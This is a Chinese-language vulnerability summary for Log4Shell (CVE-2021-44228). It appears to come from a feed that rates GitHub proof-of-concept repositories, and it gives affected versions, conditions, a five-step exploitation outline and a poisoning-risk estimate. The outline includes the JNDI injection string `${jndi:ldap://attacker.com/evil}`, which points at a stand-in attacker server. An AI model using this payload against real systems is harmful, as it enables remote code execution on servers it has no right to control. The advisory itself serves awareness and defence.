## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个关键漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意 JNDI 查找字符串注入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析并记录包含恶意 JNDI 查找的日志消息时，它会联系攻击者控制的 LDAP 或 RMI 服务器，并执行服务器返回的恶意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者将包含特定格式的恶意字符串（例如 `${jndi:ldap://attacker.com/evil}`）注入到应用程序可以记录的任何输入字段中，例如 HTTP 请求头、POST 数据、Web 表单等。
2.  **应用程序记录日志：** 如果应用程序使用受影响版本的 Log4j2 记录包含恶意字符串的输入，Log4j2 将尝试解析该字符串。
3.  **JNDI 查找触发：** Log4j2 发现 `${jndi:...}` 模式，触发 JNDI 查找。
4.  **连接恶意服务器：** Log4j2 使用指定的协议（例如 LDAP、RMI）连接到攻击者控制的服务器 (attacker.com)。
5.  **执行恶意代码：** 攻击者的服务器返回包含恶意 Java 对象的响应。Log4j2 反序列化该对象，导致在目标服务器上执行任意代码。

**有效性：**

提供的POC代码（技术分析文档）描述了该漏洞的原理，受影响版本以及利用过程，可以辅助构建PoC。漏洞利用的有效性取决于目标系统是否使用了受影响的Log4j2版本，并且是否允许出站网络连接到攻击者的JNDI服务器。由于 Log4Shell 在野外被广泛利用，因此认为提供的分析是基于真实可利用的漏洞的。

**投毒风险：**

提供的代码主要为技术分析文档，本身不包含可直接执行的恶意代码。但是，任何代码仓库都存在一定程度的投毒风险。在这种情况下，如果攻击者成功篡改了仓库中的分析文档，他们可能会插入误导性信息或隐藏的恶意链接，从而诱导用户下载或执行恶意软件。风险评估为10%，因仓库主要为分析文档，直接嵌入恶意代码可能性较低。

**项目地址:** [PCMKUIT/CVE-2021-44228---Log4Shell-Analysis](https://github.com/PCMKUIT/CVE-2021-44228---Log4Shell-Analysis)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)